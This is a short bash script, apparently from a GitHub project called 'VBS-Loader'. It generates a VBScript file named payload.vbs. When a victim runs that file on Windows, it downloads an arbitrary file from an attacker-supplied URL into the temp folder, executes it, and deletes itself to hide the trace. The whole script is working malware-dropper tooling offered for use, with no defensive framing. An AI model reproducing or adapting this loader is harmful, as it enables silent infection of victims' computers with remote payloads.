#!/bin/bash
# https://github.com/LimerBoy/VBS-Loader

# Read arguments
url=$1;
if [ -z $url ]
then
    echo -e "\e[1m\e[31m[!] \e[0m\e[95mUsage: $0 <direct-url-to-file>";
    exit 1;
fi

# Data
file=$(echo "${url##*/}");
vbsf="payload.vbs";

# Payload code
payload=("
'Created by LimerBoy
\ndim temp: temp = WScript.CreateObject(\"Scripting.FileSystemObject\").GetSpecialFolder(2) + \"\\$file\"
\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")
\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")
\nxHttp.Open \"GET\", \"$url\", False
\nxHttp.Send
\nwith bStrm
\n    .type = 1 '//binary
\n    .open
\n    .write xHttp.responseBody
\n    .savetofile temp, 2 '//overwrite
\nend with
\nCreateObject(\"WScript.Shell\").Run temp
\nCreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)
");

# Write payload code to file
echo -e $payload > $vbsf;

# Done
echo -e "\e[1m\e[32m[+] \e[0m\e[92mFile saved! $vbsf";
